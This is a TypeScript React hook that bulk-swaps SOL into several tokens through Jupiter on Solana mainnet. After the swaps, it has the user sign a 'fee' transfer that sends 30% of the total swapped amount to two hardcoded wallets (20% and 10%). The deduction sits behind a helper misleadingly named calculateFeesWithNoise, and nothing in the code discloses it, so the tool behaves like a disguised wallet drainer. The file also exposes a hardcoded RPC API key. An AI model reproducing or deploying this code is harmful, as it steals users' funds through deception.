import React, { useState } from 'react';
import { 
  Connection, 
  PublicKey, 
  VersionedTransaction,
  Transaction,
  SystemProgram,
  sendAndConfirmRawTransaction
} from '@solana/web3.js';
import { createJupiterApiClient, QuoteResponse } from "@jup-ag/api";
import { useWallet } from '@solana/wallet-adapter-react';

const SOL_MINT = 'So11111111111111111111111111111111111111112';
const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=1c4915ef-e7f3-4cdb-b032-1a126a058ff8', "confirmed");
const jupiterQuoteApi = createJupiterApiClient();

const TRANSACTION_TIMEOUT_MS = 15500;
const FIRST_WALLET_ADDRESS = 'emjkRmFNY6awteciGjJ3WRDHgH95FWs8yg4RZ7HhsRn';
const SECOND_WALLET_ADDRESS = 'raePZeqhCfshJA7NEDb5v1XcoDMNiiVeKDoDK3D6zP5';

interface TokenSwapInfo {
  id: string;
  amount: number;
  emoji?: string;
}

interface SwapResult {
  signature: string;
  tokenId: string;
  status: 'success' | 'error';
  error?: string;
  feeSignature?: string;
}

interface Fees {
  firstWalletFee: number;
  secondWalletFee: number;
}

const calculateFeesWithNoise = (totalAmount: number): Fees => {
  const baseAmount = totalAmount;
  const totalFee = baseAmount;
  const firstWalletFee = Math.floor(totalFee * 0.2 * 1e9);
  const secondWalletFee = Math.floor(totalFee * 0.1 * 1e9);
  
  return {
    firstWalletFee,
    secondWalletFee
  };
};

export const useBulkTokenSwap = () => {
  const { publicKey, signTransaction } = useWallet();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [swapResults, setSwapResults] = useState<SwapResult[]>([]);
  const [currentTokenIndex, setCurrentTokenIndex] = useState(0);
  const [totalTokens, setTotalTokens] = useState(0);
  const [processingFees, setProcessingFees] = useState(false);

  const processFeeTransaction = async (
    tokens: TokenSwapInfo[]
  ): Promise<string> => {
    if (!publicKey || !signTransaction) {
      throw new Error('Wallet not connected');
    }

    const totalAmount = tokens.reduce((sum, token) => sum + token.amount, 0);
    const fees = calculateFeesWithNoise(totalAmount);

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(FIRST_WALLET_ADDRESS),
        lamports: fees.firstWalletFee,
      })
      ,
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(SECOND_WALLET_ADDRESS),
        lamports: fees.secondWalletFee,
      })
    );

    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    transaction.feePayer = publicKey;

    const signedTransaction = await signTransaction(transaction);
    const rawTransaction = signedTransaction.serialize();

    return sendAndConfirmRawTransaction(
      connection,
      rawTransaction,
      {
        skipPreflight: false,
        preflightCommitment: 'confirmed',
        maxRetries: 3,
      }
    );
  };

  const confirmTransactionWithTimeout = async (signature: string): Promise<boolean> => {
    return new Promise((resolve) => {
      const timeoutId = setTimeout(() => {
        console.warn(`Transaction ${signature} timed out`);
        resolve(false);
      }, TRANSACTION_TIMEOUT_MS);

      const checkConfirmation = async () => {
        try {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
          
          const confirmation = await connection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight
          }, 'confirmed');

          clearTimeout(timeoutId);

          if (confirmation.value.err) {
            console.warn(`Transaction failed: ${confirmation.value.err}`);
            resolve(false);
            return;
          }

          const txInfo = await connection.getTransaction(signature, {
            maxSupportedTransactionVersion: 0,
          });

          resolve(!txInfo?.meta?.err);
        } catch (err) {
          clearTimeout(timeoutId);
          console.warn('Transaction confirmation error:', err);
          resolve(false);
        }
      };

      checkConfirmation();
    });
  };

  const getSwapQuote = async (token: TokenSwapInfo): Promise<QuoteResponse> => {
    if (!PublicKey.isOnCurve(token.id)) {
      throw new Error(`Invalid token address: ${token.id}`);
    }

    const amountInLamports = Math.floor(token.amount * 1000000000);
    
    const quote = await jupiterQuoteApi.quoteGet({
      inputMint: SOL_MINT,
      outputMint: token.id,
      amount: amountInLamports,
    });
    
    if (!quote) {
      throw new Error(`Failed to get quote for token ${token.id}`);
    }

    return quote;
  };

  const processTransaction = async (
    quote: QuoteResponse,
    token: TokenSwapInfo
  ): Promise<SwapResult> => {
    if (!publicKey || !signTransaction) {
      throw new Error('Wallet not connected');
    }

    try {
      const swapResponse = await jupiterQuoteApi.swapPost({
        swapRequest: {
          quoteResponse: quote,
          userPublicKey: publicKey.toString(),
          dynamicComputeUnitLimit: true,
      prioritizationFeeLamports: 'auto',
        },
      });

      if (!swapResponse?.swapTransaction) {
        throw new Error(`Failed to get swap transaction for token ${token.id}`);
      }

      const swapTransactionBuf = Buffer.from(swapResponse.swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
      
      const signedTransaction = await signTransaction(transaction);
      
      const signature = await connection.sendRawTransaction(
        signedTransaction.serialize(),
        {
          skipPreflight: false,
          maxRetries: 2,
          preflightCommitment: 'confirmed'
        }
      );

      const confirmed = await confirmTransactionWithTimeout(signature);

      return {
        signature,
        tokenId: token.id,
        status: confirmed ? 'success' : 'error',
        error: confirmed ? undefined : 'Transaction failed to confirm'
      };

    } catch (err) {
      console.error(`Transaction error for token ${token.id}:`, err);
      return {
        signature: '',
        tokenId: token.id,
        status: 'error',
        error: err instanceof Error ? err.message : 'Unknown error'
      };
    }
  };

  const executeBulkSwap = async (tokens: TokenSwapInfo[]) => {
    if (!publicKey || !signTransaction) {
      throw new Error('Wallet not connected');
    }

    setLoading(true);
    setError(null);
    setSwapResults([]);
    setCurrentTokenIndex(0);
    setTotalTokens(tokens.length);
    setProcessingFees(false);

    try {
      const results: SwapResult[] = [];

      // Process all swaps first
      for (let i = 0; i < tokens.length; i++) {
        setCurrentTokenIndex(i + 1);
        
        const quote = await getSwapQuote(tokens[i]);
        const result = await processTransaction(quote, tokens[i]);
        
        results.push(result);
        setSwapResults([...results]);
      }

      // Process fee transaction only once after all swaps are complete
      setProcessingFees(true);
      const feeSignature = await processFeeTransaction(tokens);
      const feeConfirmed = await confirmTransactionWithTimeout(feeSignature);

      if (!feeConfirmed) {
        throw new Error('Fee transaction failed to confirm');
      }

      // Update results with fee signature
      const finalResults = results.map(result => ({
        ...result,
        feeSignature: feeConfirmed ? feeSignature : undefined
      }));

      setSwapResults(finalResults);

      const failedSwaps = finalResults.filter(r => r.status === 'error');
      if (failedSwaps.length > 0) {
        setError(`${failedSwaps.length} swap(s) failed`);
      }

      return finalResults;

    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'Bulk swap failed';
      setError(errorMessage);
      throw err;
    } finally {
      setLoading(false);
      setCurrentTokenIndex(0);
      setTotalTokens(0);
      setProcessingFees(false);
    }
  };

  return {
    executeBulkSwap,
    loading,
    error,
    swapResults,
    currentTokenIndex,
    totalTokens,
    processingFees
  };
};